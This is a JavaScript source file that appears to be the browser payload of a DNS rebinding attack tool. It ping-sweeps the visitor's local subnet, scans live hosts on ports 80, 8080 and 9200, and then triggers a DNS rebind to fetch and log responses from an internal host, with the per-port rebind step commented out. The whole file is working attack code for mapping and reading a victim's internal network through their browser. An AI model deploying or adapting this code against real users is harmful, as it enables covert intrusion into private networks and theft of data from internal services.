import NetMap from 'netmap.js'
import * as network from '../libs/network'
import Session from '../libs/session'

const session = new Session()

async function mainFrame () {
  const netmap = new NetMap()
  const localSubnet = await network.getLocalSubnet(24)

  netmap.pingSweep(localSubnet).then(sweepResults => {
    session.log(sweepResults)

    const liveHosts = sweepResults.hosts.filter(h => { return h.live }).map(h => h.host)

    console.log(liveHosts)

    netmap.tcpScan(liveHosts, [80, 8080, 9200]).then(results => {
      session.log(results)
      // for (let h of results.hosts) {
      //   for (let p of h.ports) {
      //     if (p.open) session.createRebindFrame(h.host, p.port)
      //   }
      // }
    })
  })
}

function rebindFrame () {
  session.triggerRebind().then(() => {
    network.get(session.baseURL, {
      successCb: (code, headers, body) => {
        session.log({ code: code, headers: headers, body: body })
      }
    })
  })
}

if (window.args && window.args._rebind) rebindFrame()
else mainFrame()
